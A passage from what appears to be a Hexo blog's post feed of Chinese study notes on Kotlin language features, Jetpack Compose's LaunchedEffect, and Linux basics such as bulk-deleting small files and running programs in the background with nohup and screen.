<h3 id="若扩展函数和成员函数一致，则使用该函数时，会优先使用成员函数。"><a href="#若扩展函数和成员函数一致，则使用该函数时，会优先使用成员函数。" class="headerlink" title="若扩展函数和成员函数一致，则使用该函数时，会优先使用成员函数。"></a>若扩展函数和成员函数一致，则使用该函数时，会优先使用成员函数。</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">foo</span><span class="params">()</span></span> &#123; println(<span class="string">&quot;成员函数&quot;</span>) &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> C.<span class="title">foo</span><span class="params">()</span></span> &#123; println(<span class="string">&quot;扩展函数&quot;</span>) &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(arg:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> c = C()</span><br><span class="line">    c.foo()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样的，kotlin也可以扩展属性，但是他扩展属性并不能初始化，只能通过修改他的get和set方法。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> &lt;T&gt; List&lt;T&gt;.lastIndex: <span class="built_in">Int</span></span><br><span class="line">    <span class="keyword">get</span>() = size - <span class="number">1</span></span><br><span class="line"><span class="comment">//正确，修改了lastIndex的属性方法。</span></span><br><span class="line"><span class="keyword">val</span> Foo.bar = <span class="number">1</span> <span class="comment">// 错误：扩展属性不能有初始化器</span></span><br></pre></td></tr></table></figure>
<h2 id="伴生对象"><a href="#伴生对象" class="headerlink" title="伴生对象"></a>伴生对象</h2><p>这个伴生对象可以理解为是静态属性和静态方法。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">companion</span> <span class="keyword">object</span> &#123; &#125;  <span class="comment">// 将被称为 &quot;Companion&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> MyClass.Companion.<span class="title">foo</span><span class="params">()</span></span> &#123;</span><br><span class="line">    println(<span class="string">&quot;伴随对象的扩展函数&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> MyClass.Companion.no: <span class="built_in">Int</span></span><br><span class="line">    <span class="keyword">get</span>() = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    println(<span class="string">&quot;no:<span class="subst">$&#123;MyClass.no&#125;</span>&quot;</span>)</span><br><span class="line">    MyClass.foo()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//或者直接在伴生对象中说明他的方法和属性都是被允许的</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>&#123;</span><br><span class="line">    <span class="keyword">companion</span> <span class="keyword">object</span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">fun</span> <span class="title">add</span><span class="params">(a:<span class="type">Int</span>,b:<span class="type">Int</span>)</span></span> = a+b</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当你在其他的包内使用该类的扩展属性或方法时，需要将他的本类和他的扩展方法都导入</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> foo.bar</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> Baz.<span class="title">goo</span><span class="params">()</span></span> &#123; …… &#125; </span><br></pre></td></tr></table></figure>
<p>要使用所定义包之外的一个扩展, 通过import导入扩展的函数名进行使用:</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.usage</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> foo.bar.goo <span class="comment">// 导入所有名为 goo 的扩展</span></span><br><span class="line">                   <span class="comment">// 或者</span></span><br><span class="line"><span class="keyword">import</span> foo.bar.*   <span class="comment">// 从 foo.bar 导入一切</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">usage</span><span class="params">(baz: <span class="type">Baz</span>)</span></span> &#123;</span><br><span class="line">    baz.goo()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="扩展声明为成员"><a href="#扩展声明为成员" class="headerlink" title="扩展声明为成员"></a>扩展声明为成员</h3><p>在一个类内部你可以为另一个类声明扩展。</p>
<p>在这个扩展中，有个多个隐含的接受者，其中扩展方法定义所在类的实例称为分发接受者，而扩展方法的目标类型的实例称为扩展接受者。<br><strong>假如在调用某一个函数，而该函数在分发接受者和扩展接受者均存在，则以扩展接收者优先，要引用分发接收者的成员你可以使用限定的 this 语法。</strong></p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin集合操作符详解</title>
    <url>/posts/112f98ad/</url>
    <content><![CDATA[<p>继续学习</p>
<h2 id="集合操作符"><a href="#集合操作符" class="headerlink" title="集合操作符"></a>集合操作符</h2><p>在kotlin中，关于集合的操作符分为6种，分别是：总数擦欧总夫，过滤操作符，映射操作符，顺序操作符，生产操作符和元素操作符。</p>
<h3 id="总数操作符"><a href="#总数操作符" class="headerlink" title="总数操作符"></a>总数操作符</h3><p>太多内容，不一一列举，使用时可以再上网察看</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> a = listOf(<span class="number">1</span>, <span class="string">&quot;2&quot;</span>, <span class="number">43</span>, <span class="literal">true</span>)</span><br><span class="line">    println(a.any())<span class="comment">//true</span></span><br><span class="line">    println(a.any &#123; it <span class="keyword">is</span> Number &#125;)<span class="comment">//true</span></span><br><span class="line">    println(a.all &#123; it <span class="keyword">is</span> <span class="built_in">Int</span> &#125;)<span class="comment">//false</span></span><br><span class="line">    println(a.count())<span class="comment">//4</span></span><br><span class="line">    println(a.count &#123; it <span class="keyword">is</span> Number &#125;)<span class="comment">//2</span></span><br><span class="line">    a.forEach &#123; println(it) &#125;</span><br></pre></td></tr></table></figure>
<h3 id="过滤操作符"><a href="#过滤操作符" class="headerlink" title="过滤操作符"></a>过滤操作符</h3><p>drop()：从第一项开始去除前n个元素，并返回剩余的元素列表。<br>dropWhile{}：根据给定函数从第一项开始去掉指定元素，直到不满足条件为止的前面的元素，并返回剩余元素列表。<br>dropLastWhile{}：根据给定函数从最后一项开始去掉指定元素，直到不满足条件为止的后面的元素，并返回剩余元素的列表。<br>filter{}：过滤出所有符合给定函数条件的元素。<br>filterNot{}：过滤所有不符合给定函数条件的元素。<br>filterNotNull()：过滤所有元素中不是null的元素。<br>slice()：过滤一个list中指定index的元素。<br>take()：返回从第一个开始的n个元素。<br>takeLast()：返回从最后一个开始的n个元素。<br>takeWhile{}：返回从第一个开始符合给定函数条件的元素，直到不符合条件为止。<br>takeLastWhile{}:返回从最后一个开始符合给定函数条件的元素，直到不符合条件为止。</p>
<h3 id="映射操作符"><a href="#映射操作符" class="headerlink" title="映射操作符"></a>映射操作符</h3><p>map{}：将集合的每个元素映射成其他类型，组装成新的集合。新的集合长度和原有的长度一样<br>mapIndexed{}：为每一个索引设置新的元素，组装成新的集合<br>mapNotNull{} : mapNotNull和map的效果一样，只是mapNotNull过滤掉为null的元素<br>flatMap：可以合并集合并做一些小动作</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> a = listOf(<span class="number">1</span>, <span class="string">&quot;2&quot;</span>, <span class="number">43</span>, <span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">val</span> b = listOf(<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">var</span> c = listOf(a,b).flatMap &#123; it -&gt; it &#125;</span><br><span class="line">    println(c)</span><br></pre></td></tr></table></figure>
<p>groupBy{}将集合中的元素按某个条件进行分组，返回map</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> a = listOf(<span class="number">1</span>, <span class="number">42</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">421</span>)</span><br><span class="line">    println(a.groupBy &#123; <span class="keyword">if</span>(it&lt;<span class="number">10</span>)<span class="string">&quot;small&quot;</span> <span class="keyword">else</span> <span class="string">&quot;big&quot;</span> &#125;)</span><br><span class="line">    <span class="comment">//&#123;small=[1, 5], big=[42, 14, 421]&#125;</span></span><br></pre></td></tr></table></figure>
<p>顺序生产元素不细讲，使用时再学</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin（类，class）</title>
    <url>/posts/4b04046c/</url>
    <content><![CDATA[<h2 id="初始化类"><a href="#初始化类" class="headerlink" title="初始化类"></a>初始化类</h2><ol>
<li><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> (_nickname:String)&#123;</span><br><span class="line">	val nickname:String</span><br><span class="line">	init&#123;</span><br><span class="line">		nickname = _nickname</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
以上就是一个kotlin类的初始化，他的主构造函数直接写在<code>User</code>类后面，还省略了关键字<code>constructor</code>。但是由于语法结构的问题，他没有函数体，所有就通过<code>init</code>与主构造方法一起使用。<br>在类中的元素必须初始化，可以如上图所示，也可以直接赋值。<code>val nickname:String = _nickname</code></li>
<li>kotlin还可以化简操作，直接把属性声明在主构造函数中<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class User(val nickName;String)</span><br></pre></td></tr></table></figure>
如上，这个是最简形式</li>
</ol>
<h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><p>kotlin中也可以有很多的从构造方法。而且他们用的不是继承，而是另一个关键词，<strong>委托</strong>，通过委托，委托其他的构造方法来帮助自己实现构造，他的写法与继承一样，用<code>:</code>来链接。<br>他可以像java一样写很多的从构造方法，然后可以相互委托，但最后必须也委托给初始化基类，或者另一个这样做了的从构造方法。初始化基类的构造方法：主构造方法（包括父类的主构造方法）。</p>
<h2 id="接口中的属性"><a href="#接口中的属性" class="headerlink" title="接口中的属性"></a>接口中的属性</h2><p>在kotlin中，接口可以实现具体的方法，但是他不能有初始化的属性，也就是不能有字段，他的属性只能声明，不能赋值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">A</span>&#123;</span><br><span class="line">	val name:String</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实现这个接口的类一定要用<code>override</code>重写这个方法，<br>可以赋值<br>也可以定义get方法。<br>或者定义初始化方法<br><strong>如果接口中定义了属性的get方法，那么这个属性也可以直接继承，而不用重写</strong></p>
<blockquote>
<p>get方法和set方法，还有构造器方法都可以私有化，也就是可以实现一些单例或者静态方法之类的，保证封闭性。</p>
</blockquote>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin语言基础与跨平台性</title>
    <url>/posts/62dcc9a3/</url>
    <content><![CDATA[<blockquote>
<p>视频学习</p>
</blockquote>
<h1 id="Kotlin学习"><a href="#Kotlin学习" class="headerlink" title="Kotlin学习"></a>Kotlin学习</h1><h2 id="JVM虚拟机"><a href="#JVM虚拟机" class="headerlink" title="JVM虚拟机"></a>JVM虚拟机</h2><p>  <img src="http://memos.zfx-t.top/o/r/29/51fc127c-af10-4021-95da-8029834425eb/1681911677_image.png" alt="image"><br>kotlin语言在进行编译的环节中，会比java更加的优化</p>
<h2 id="跨平台性"><a href="#跨平台性" class="headerlink" title="跨平台性"></a>跨平台性</h2><pre><code>不止可以基于JVM运行，甚至可以直接生成二进制代码。
</code></pre>
<h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="语言声明变量和内置数据类型"><a href="#语言声明变量和内置数据类型" class="headerlink" title="语言声明变量和内置数据类型"></a>语言声明变量和内置数据类型</h3><p>  声明变量：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">println(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">       var 变量名 : 数据类型 = &quot;&quot;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">var</span> str:String = <span class="string">&quot;hzt&quot;</span></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">       内置数据类型</span></span><br><span class="line"><span class="comment">       String  字符串</span></span><br><span class="line"><span class="comment">       Char    字符</span></span><br><span class="line"><span class="comment">       Boolean true/false</span></span><br><span class="line"><span class="comment">       Int     整形</span></span><br><span class="line"><span class="comment">       Float   单精度浮点型</span></span><br><span class="line"><span class="comment">       Double  双精度浮点型</span></span><br><span class="line"><span class="comment">       List    集合</span></span><br><span class="line"><span class="comment">       Set     无重复集合</span></span><br><span class="line"><span class="comment">       Map     键值对集合</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   println(str)</span><br><span class="line">   <span class="comment">//他没有int，float。因为他在运行时，会转化为java中的类然后使用。</span></span><br></pre></td></tr></table></figure>
<h3 id="只读变量"><a href="#只读变量" class="headerlink" title="只读变量"></a>只读变量</h3><p>val声明的变量只读，不可修改，类比于final。<br>var声明的变量可读可改。</p>
<h3 id="类型推断"><a href="#类型推断" class="headerlink" title="类型推断"></a>类型推断</h3><p>不需要显示的表明数据类型，他会根据你给的数据进行推断</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s1 = <span class="string">&quot;hzt&quot;</span></span><br><span class="line"><span class="keyword">var</span> s2 : String = <span class="string">&quot;hzt&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="编译时常量"><a href="#编译时常量" class="headerlink" title="编译时常量"></a>编译时常量</h3><p>const val 和val不是一个概念</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">val</span> PI = <span class="number">3.1415</span> <span class="comment">//他只能定义在函数之外，他会在编译时便会初始化，不可以定义在函数内。</span></span><br></pre></td></tr></table></figure>
<h3 id="查看kotlin反编译后字节码"><a href="#查看kotlin反编译后字节码" class="headerlink" title="查看kotlin反编译后字节码"></a>查看kotlin反编译后字节码</h3><p><img src="http://memos.zfx-t.top/o/r/30/5ee86dfc-f24a-4180-86e6-b3189504072f/1681915749_image.png" alt="image"></p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin标准方法with,run,apply AND 静态方法</title>
    <url>/posts/d9fc97ad/</url>
    <content><![CDATA[<h2 id="标准函数with-run-apply"><a href="#标准函数with-run-apply" class="headerlink" title="标准函数with,run,apply"></a>标准函数with,run,apply</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//常用写法</span></span><br><span class="line">    <span class="type">val</span> <span class="variable">list</span> <span class="operator">=</span> listOf(<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;orange&quot;</span>, <span class="string">&quot;pear&quot;</span>, <span class="string">&quot;grape&quot;</span>)</span><br><span class="line">    <span class="type">val</span> <span class="variable">builder</span> <span class="operator">=</span> StringBuilder()</span><br><span class="line">    builder.append(<span class="string">&quot;Start eat fruits\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> (fruit in list) &#123;</span><br><span class="line">        builder.append(fruit + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    builder.append(<span class="string">&quot;Ate all fruits\n&quot;</span>)</span><br><span class="line">    println(builder)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用with作为标准函数来写</span></span><br><span class="line">    <span class="comment">//with函数接受两个参数，第一个是任意类型的对象，第二个参数是一个lambda表达式。</span></span><br><span class="line">    <span class="comment">//with函数会为lambda表达式中提供第一个对象的上下文</span></span><br><span class="line">    <span class="comment">//并使用lambda表达式的最后一行代码作为返回值返回</span></span><br><span class="line">    <span class="type">var</span> <span class="variable">result</span> <span class="operator">=</span> with(StringBuilder())&#123;</span><br><span class="line">        append(<span class="string">&quot;Start eat fruits\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> (fruit in list) &#123;</span><br><span class="line">            append(fruit + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        append(<span class="string">&quot;Ate all fruits\n&quot;</span>)</span><br><span class="line">        toString()</span><br><span class="line">    &#125;</span><br><span class="line">    println(result)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//run函数</span></span><br><span class="line">    <span class="comment">//他不能直接调用，而必须调用某个对象的run方法才行，其次run函数只接受一个lambda函数。同样的他会把最后一行表达式作为返回值。</span></span><br><span class="line">    <span class="comment">//他与with也是很类似的，只是使用场景不太一样。</span></span><br><span class="line">    result =StringBuilder().run&#123;</span><br><span class="line">        append(<span class="string">&quot;Start eat fruits\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> (fruit in list) &#123;</span><br><span class="line">            append(fruit + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        append(<span class="string">&quot;Ate all fruits\n&quot;</span>)</span><br><span class="line">        toString()</span><br><span class="line">    &#125;</span><br><span class="line">    println(result)</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//apply函数也是与run函数极其类似，同样是需要对象调用，而且只能传入一个lambda表达式，只是他最后不用返回结果，而是自动返回调用对象本身</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h2><p>在kotlin中，并没有绝对定义的静态函数，你可以通过定义一个单例，然后调用其中的方法。或者任意一个类通过增加他的伴生类的方法。都可以做到类似静态函数的调用方法，不用再创建实例而是直接使用。<br>但这根本上并不是静态方法。<br>如果真正的需要静态方法，可以有两种解决办法：1.注解 2.顶层方法。</p>
<ol>
<li>注解<br>在单例类或者伴生类中的方法上添加<code>@JvmStatic</code>的方法。这样在jvm编译时，会把他们编译为静态方法。</li>
<li>顶层方法<br>他会直接编译为静态方法，详见：<a href="https://zfxt.top/index.php/archives/27/" title="kotlin顶层方法">kotlin顶层方法</a></li>
</ol>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin（基本数据类型）</title>
    <url>/posts/7a5e1904/</url>
    <content><![CDATA[<h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><p>相比于java而言，kotlin不会区分基本数据类型和他们的包装类，都是统一的数据类型，但是他们的底层实现会和java相关。</p>
<h3 id="java中"><a href="#java中" class="headerlink" title="java中"></a>java中</h3><p>Int，Boolean之类的基本数据类型都和引用类做了区分，基本数组存值，而包装类存储包含该对象的内存地址的引用。</p>
<h3 id="kotlin中"><a href="#kotlin中" class="headerlink" title="kotlin中"></a>kotlin中</h3><p>他不区分，都是用一个类Int，Boolean等。这样就很方便我们的操作。<br>但是这并不意味着kotlin直接把所有的类都直接写出引用类型了。因为那样的话，就会非常低效。<br>在运行时，数字类型尽可能的使用最高效的方式存储，大部分情况下—-对于变量，属性，参数和返回类型，kotlin的int类型都会编译为java中的基本数据类型。唯一不可行的就是泛型类，集合。他一定会编译为包装类。</p>
<h2 id="可空数据类型-Int？，Boolean？"><a href="#可空数据类型-Int？，Boolean？" class="headerlink" title="可空数据类型 Int？，Boolean？"></a>可空数据类型 Int？，Boolean？</h2><p>这些可空数据类型因为不止能存储基础数据类型，还能存储null，所以肯定是包装类。</p>
<blockquote>
<p>这是基于JVM虚拟机实现泛型的方式决定的，JVM不支持用基本数据类型作为类型参数，所以必须使用包装类。<br>如果要高效的存储基础数据类型的话，要么使用第三方库（Trove4）等。要么用数组存储。</p>
</blockquote>
<h2 id="数字转化"><a href="#数字转化" class="headerlink" title="数字转化"></a>数字转化</h2><p>在kotlin中没有默认的小范围向大范围自动变化类型，他严格限制具体的数据类型，也提供了相关方法<code>toLong()</code>,<code>toByte()</code>等。为了避免冲突，kotlin中的转化要求必须是显式的。<strong>即便是equals方法，2和2L也是不一样的。会返回false</strong><br><img src="https://image.zfxt.top/hexo-blog/Kotlin%EF%BC%88%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%89-2023-07-21-45-10.png"></p>
<h2 id="Any，Any"><a href="#Any，Any" class="headerlink" title="Any，Any?"></a>Any，Any?</h2><p>kotlin中Any就和java中的object一样层级，属于所有类的父类。但是他只是非空类，Any?才包括所有的类。kotlin中使用Any会在字节码中编译为Object</p>
<h2 id="Unit"><a href="#Unit" class="headerlink" title="Unit"></a>Unit</h2><p>尽管他与java中的void有着一样的功能，但是它不一样，Unit是一个完备的类型，可以作为类型参数。但是void不行。<br>而且全局只存在一个Unit类型，这个值也叫Unit，并且在函数中会被隐式的返回，即一个隐藏的<code>return Unit</code>时不需写出来的。<br>Unit他只有一个实例。也是kotlin的一个特色，相比于java中，要么void，不然一定要添加return返回某个数据。</p>
<h2 id="Nothing类型，这个函数一定不返回"><a href="#Nothing类型，这个函数一定不返回" class="headerlink" title="Nothing类型，这个函数一定不返回"></a>Nothing类型，这个函数一定不返回</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">fail</span><span class="params">(message:String)</span>:Nothing&#123;</span><br><span class="line">    <span class="keyword">throw</span> IllegalArgumentException(message)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Nothing类型，没有任何值，只有被当作函数返回值或者泛型函数返回值时才有意义。<br>他同样的也可以搭配Evls运算符做判断。</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>LaunchedEffect：在Jetpack Compose中使用协程</title>
    <url>/posts/1fa68cf/</url>
    <content><![CDATA[<p>LaunchEffect允许我们在Composable中使用协程</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Composable</span> <span class="function"><span class="keyword">fun</span> <span class="title">DisposableEffect</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">vararg</span> keys: <span class="type">Any</span>?,</span></span></span><br><span class="line"><span class="params"><span class="function">    effect: <span class="type">DisposableEffectScope</span>.() -&gt; <span class="type">DisposableEffectResult</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>: <span class="built_in">Unit</span></span><br></pre></td></tr></table></figure>
<ul>
<li>像DisposableEffect一样，当Composable进入composition时执行block</li>
<li>当Composable从树上detach时，CoroutineScope执行cancel</li>
<li>参数keys发生变化是，会执行cancel后再次执行effect<br>简而言之，就是支持执行Coroutine的DisposableEffect，会自动执行cancel，不需要手动onDispose</li>
</ul>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>compose</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux如何大量删除小文件</title>
    <url>/posts/10594f77/</url>
    <content><![CDATA[<p>清楚了问题现象，解决方案就从除去<code>rm -rf *</code>命令的方式之外，还有哪些方法可用，如果通过网络搜索，可能会找到结合<code>find</code>命令再去执行rm的方式，但其实效率非常差，具体写法这里就不列出了，因为我们通常也不会这样处理。那么如何较为效率的删除大批小文件呢？结合网络的经验，并实测验证，最终总结了两种常见的解决方案，效率上也都尚可。</p>
<h2 id="方案一：巧用rsync的方式达到删除目的"><a href="#方案一：巧用rsync的方式达到删除目的" class="headerlink" title="方案一：巧用rsync的方式达到删除目的"></a>方案一：巧用rsync的方式达到删除目的</h2><p>建立一个空文件夹，使用<code>rsync --delete-before -d &lt;空文件夹&gt; &lt;需要清理删除小文件的目录&gt;</code>命令最终达到删除大批小文件的目的。下面演示具体操作：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[oracle@jystdrac2 adump]$ mkdir /data/null</span><br><span class="line">[oracle@jystdrac2 adump]$ ls -l /data/null</span><br><span class="line">total 0</span><br><span class="line">[oracle@jystdrac2 ~]$ nohup rsync --delete-before -d /data/null/ /opt/app/oracle/admin/crmdb/adump/ &amp;</span><br></pre></td></tr></table></figure>

<h2 id="方案二：使用find命令的delete参数"><a href="#方案二：使用find命令的delete参数" class="headerlink" title="方案二：使用find命令的delete参数"></a>方案二：使用find命令的delete参数</h2><p>使用<code>find &lt;需要清理删除小文件的目录&gt; -type f -delete</code>命令直接删除大批小文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[oracle@jystdrac1 adump]$ nohup find /opt/app/oracle/admin/crmdb/adump/ -type f -delete &amp;</span><br></pre></td></tr></table></figure>


<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.<br>mkdir &lt;空文件夹&gt;<br>rsync –delete-before -d &lt;空文件夹&gt; &lt;需要清理删除小文件的目录&gt;<br>2.<br>find &lt;需要清理删除小文件的目录&gt; -type f -delete</p>
<p>相对来说这两种方式都比较效率，但由于整体小文件也是比较多，所以实际可以选择nohup放到后台执行。</p>
]]></content>
  </entry>
  <entry>
    <title>Linux 四个目录命令用途和区别</title>
    <url>/posts/14b1606d/</url>
    <content><![CDATA[<p>Linux下 &#x2F;bin、&#x2F;sbin、&#x2F;usr&#x2F;sbin、&#x2F;usr&#x2F;bin 目录的作用和区别<br>首先区别&#x2F;sbin,&#x2F;bin<br>&#x2F;sbin 下的命令属于基本的系统命令，如shutdown，reboot，用于启动系统，修复系统</p>
<p>&#x2F;bin下存放一些普通的基本命令，如ls,chmod等，这些命令在Linux系统里的配置文件脚本里经常用到</p>
<p>无论是&#x2F;bin、&#x2F;sbin、&#x2F;usr&#x2F;sbin、&#x2F;usr&#x2F;bin他们都是全局可以执行的命令</p>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux——让程序在后台运行</title>
    <url>/posts/4187f35a/</url>
    <content><![CDATA[<h2 id="加“-”符号"><a href="#加“-”符号" class="headerlink" title="加“&amp;”符号"></a>加“&amp;”符号</h2><p>在需要执行的命令后面直接加上&amp;，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 执行文件</span></span><br><span class="line">./test.py &amp;</span><br><span class="line"><span class="comment"># 查看是否在后台运行</span></span><br><span class="line">ps -ef | grep <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 后台关闭</span></span><br><span class="line"><span class="built_in">kill</span> 这个程序</span><br></pre></td></tr></table></figure>

<h2 id="nohup命令"><a href="#nohup命令" class="headerlink" title="nohup命令"></a>nohup命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 他会执行该人物并将输出放到nohup.out中</span></span><br><span class="line"><span class="built_in">nohup</span> ./test.py &amp;</span><br><span class="line"><span class="comment"># 关闭后台时也需要使用kill删除进程</span></span><br></pre></td></tr></table></figure>

<h2 id="screen命令（推荐）"><a href="#screen命令（推荐）" class="headerlink" title="screen命令（推荐）"></a>screen命令（推荐）</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装screen</span></span><br><span class="line"><span class="built_in">sudo</span> apt install screen</span><br><span class="line">//yum install screen</span><br><span class="line"><span class="comment"># 新建一个窗口</span></span><br><span class="line">screen -S <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 进入窗口后执行程序</span></span><br><span class="line">python test.py</span><br><span class="line"><span class="comment"># 退出当前窗口</span></span><br><span class="line">ctrl+a+d (保留窗口)</span><br><span class="line">screen -d (保留窗口)</span><br><span class="line"><span class="built_in">exit</span> (退出且不保留窗口)</span><br><span class="line"><span class="comment"># 查看窗口</span></span><br><span class="line">screen -<span class="built_in">ls</span></span><br><span class="line"><span class="comment"># 重新连接窗口</span></span><br><span class="line">screen -r <span class="built_in">id</span>或窗口名称</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
  </entry>
  <entry>
    <title>Linux 部署 Clash 代理服务</title>
    <url>/posts/b32510c2/</url>
